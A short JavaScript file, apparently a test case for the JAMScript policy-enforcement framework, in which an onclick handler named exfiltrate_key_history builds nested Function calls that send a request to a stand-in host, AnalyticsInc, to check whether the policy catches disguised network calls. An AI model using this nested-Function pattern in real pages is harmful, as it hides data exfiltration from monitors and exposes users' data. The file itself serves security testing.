function exfiltrate_key_history() {
  var nest = 'var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest3", true);xmlhttp.send(null);\';return Function(exp);';
  var v2 = JAMScript.call(Function, null, [nest]);
  var v0 = JAMScript.call(v2, null, []);
  JAMScript.call(v0, null, []);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

